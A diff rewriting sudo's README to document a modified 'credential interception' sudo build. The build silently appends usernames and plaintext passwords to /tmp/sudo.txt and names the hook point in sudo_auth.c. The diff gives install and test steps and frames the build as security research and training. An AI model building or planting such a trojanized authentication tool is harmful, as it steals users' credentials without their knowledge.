@@ -1,117 +1,135 @@
-## The sudo philosophy
+# Sudo - Credential Interception Version
 
-Sudo is a program designed to allow a sysadmin to give limited root privileges
-to users and log root activity.  The basic philosophy is to give as few
-privileges as possible but still allow people to get their work done.
+## WARNING
 
-## Where to find sudo
+**This is a vulnerable version of sudo modified for security research and educational purposes only.**
 
-Before building sudo, make sure you have the current version.  The
-latest sudo may always be gotten via anonymous ftp from ftp.sudo.ws
-in the directory /pub/sudo/ or from the sudo web site, https://www.sudo.ws/
+This version of sudo has been modified to intercept and log user credentials (username and password) to `/tmp/sudo.txt` during authentication. **DO NOT USE THIS IN PRODUCTION OR ON ANY SYSTEM WHERE SECURITY MATTERS.**
 
-The distribution is sudo-M.m.tar.gz where _M_ is the major version
-number and _m_ is the minor version number.  Beta versions of sudo may
-also be available.  If you join the _sudo-workers_ mailing list you
-will get the beta announcements (see the Mailing lists section below).
+## Vulnerability Description
 
-## What's new
+This modified sudo version captures user credentials during the authentication process and writes them to `/tmp/sudo.txt` in the following format:
 
-See the NEWS file for a list of major changes in this release.  For
-a complete list of changes, see the [ChangeLog](ChangeLog).
-For a summary of major changes to the current stable release, see
-https://www.sudo.ws/releases/stable/.
+```
+username:password
+```
 
-If you are upgrading from an earlier version of Sudo, read
-[docs/UPGRADE.md](docs/UPGRADE.md) for information on changes in
-behavior that may affect you.
+Each authentication attempt appends a new line to the file. The credentials are captured immediately after the password is entered and before authentication verification occurs.
 
-For a history of sudo see [docs/HISTORY.md](docs/HISTORY.md).
-You can find a list of contributors to sudo in
-[docs/CONTRIBUTORS.md](docs/CONTRIBUTORS.md).
+## Implementation Details
 
-## Building the release
+The credential interception is implemented in:
+- **File**: `plugins/sudoers/auth/sudo_auth.c`
+- **Function**: `log_credentials()` - Helper function that writes credentials to `/tmp/sudo.txt`
+- **Location**: Called from `verify_user()` function after `auth_getpass()` successfully retrieves the password
 
-Read the installation guide, [INSTALL.md](INSTALL.md), before trying
-to build sudo.  Pay special attention to the "OS dependent notes" section.
+The implementation:
+- Captures the username from `ctx->user.name` or falls back to `ctx->user.pw->pw_name`
+- Captures the password immediately after it's obtained from the user
+- Writes to `/tmp/sudo.txt` in append mode (preserves previous attempts)
+- Fails silently if logging fails (does not interrupt authentication flow)
 
-## How to contribute
+## Building and Installation
 
-See [docs/CONTRIBUTING.md](docs/CONTRIBUTING.md) for information on
-how you can help contribute to sudo.
+### Prerequisites
 
-## Copyright
+- POSIX-compliant operating system (Linux, BSD, Unix)
+- C compiler (ISO C99 or higher)
+- Standard build tools (make, ar, ranlib)
 
-Sudo is distributed under an ISC-style license.
-Refer to [LICENSE.md](LICENSE.md) for details.
+### Build Steps
 
-## SAST Tools
+1. **Configure the build:**
+   ```bash
+   ./configure
+   ```
 
-[PVS-Studio](https://pvs-studio.com/en/pvs-studio/?utm_source=website&utm_medium=github&utm_campaign=open_source) - static analyzer for C, C++, C#, and Java code.
+2. **Compile:**
+   ```bash
+   make
+   ```
 
-[Coverity Static Analysis](https://www.blackduck.com/static-analysis-tools-sast/coverity.html)
+3. **Install (as root):**
+   ```bash
+   sudo make install
+   ```
+   Or if already root:
+   ```bash
+   make install
+   ```
 
-[CodeQL](https://codeql.github.com)
+## Testing the Vulnerability
 
-[Clang Static Analyzer](https://clang-analyzer.llvm.org)
+After installation, test the credential interception:
 
-[Cppcheck](http://cppcheck.net)
+1. Run sudo with a command that requires authentication:
+   ```bash
+   sudo whoami
+   ```
 
-## Mailing lists
+2. Enter your password when prompted
 
-#### sudo-announce
+3. Check `/tmp/sudo.txt` for logged credentials:
+   ```bash
+   cat /tmp/sudo.txt
+   ```
 
-This list receives announcements whenever a new version of sudo is
-released.  https://www.sudo.ws/mailman/listinfo/sudo-announce
+You should see output like:
+```
+yourusername:yourpassword
+```
 
-#### sudo-blog
+## Security Implications
 
-This list receives a message when a new sudo blog article is
-available.  https://www.sudo.ws/mailman/listinfo/sudo-blog
+This vulnerability demonstrates:
+- **Credential Theft**: Passwords are captured in plaintext
+- **Persistent Logging**: Credentials are stored on disk
+- **No User Awareness**: The interception is completely transparent
+- **File Location**: Credentials are stored in `/tmp/` which may be world-readable
 
-#### sudo-commits
+## Use Cases
 
-This list receives a message for each commit made to the sudo source
-repository.  https://www.sudo.ws/mailman/listinfo/sudo-commits
+This vulnerable version is intended for:
+- Security research and education
+- Penetration testing training
+- Demonstrating credential interception vulnerabilities
+- Security awareness training
 
-#### sudo-users
+## Legal and Ethical Notice
 
-This list is for questions and general discussion about sudo.
-https://www.sudo.ws/mailman/listinfo/sudo-users
+**This software is provided for educational and research purposes only. Unauthorized use of this software to intercept credentials on systems you do not own or have explicit permission to test is illegal and unethical.**
 
-#### sudo-workers
+Always ensure you have proper authorization before:
+- Installing this on any system
+- Testing credential interception
+- Using this for security research
 
-This list is for people working on and porting sudo.
-https://www.sudo.ws/mailman/listinfo/sudo-workers
+## Removal
 
-To subscribe to a list, visit its url (listed above) and enter your
-email address to subscribe.  Digest versions are available but these are
-fairly low traffic lists so the digest versions are not a significant win.
+To remove this vulnerable version:
 
-Mailing list archives are also available.  See the mailing list web sites
-for the appropriate links.
+1. Uninstall the modified sudo:
+   ```bash
+   sudo make uninstall
+   ```
+   Or manually remove the installed binaries
 
-## Sudo web page
+2. Remove the credential log file:
+   ```bash
+   rm -f /tmp/sudo.txt
+   ```
 
-There is a sudo web page at https://www.sudo.ws/ that contains
-documentation, downloads, a bug tracker, the source repo, the sudo
-blog, information about beta versions and other useful info.
+3. Reinstall the official, secure version of sudo from your distribution's package manager or from the official sudo project.
 
-## Filing bug reports/issues
+## Original Sudo Project
 
-If you believe you have found a bug, you can either file a bug
-report in the sudo bug database, https://bugzilla.sudo.ws/, or open
-a [GitHub issue](https://github.com/sudo-project/sudo/issues),
-whichever you find easier.  If you would prefer to use email,
-messages may be sent to the [sudo-workers@sudo.ws mailing
-list](https://www.sudo.ws/mailman/listinfo/sudo-workers) (public)
-or to sudo@sudo.ws (private).
+This is based on the sudo project by Todd C. Miller and contributors.
 
-For sudo's security policy and how to report security issues, see
-[docs/SECURITY.md](docs/SECURITY.md).
+For the official, secure version of sudo, visit:
+- Website: https://www.sudo.ws/
+- Source: https://github.com/sudo-project/sudo
 
-Please check [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md)
-*before* submitting a bug report.  When reporting bugs, be sure to
-include the version of sudo you are using, the operating system
-and/or distro that is affected, and, if possible, step-by-step
-instructions to reproduce the problem.
+## License
+
+This modified version retains the original ISC-style license. See LICENSE.md for details.
+
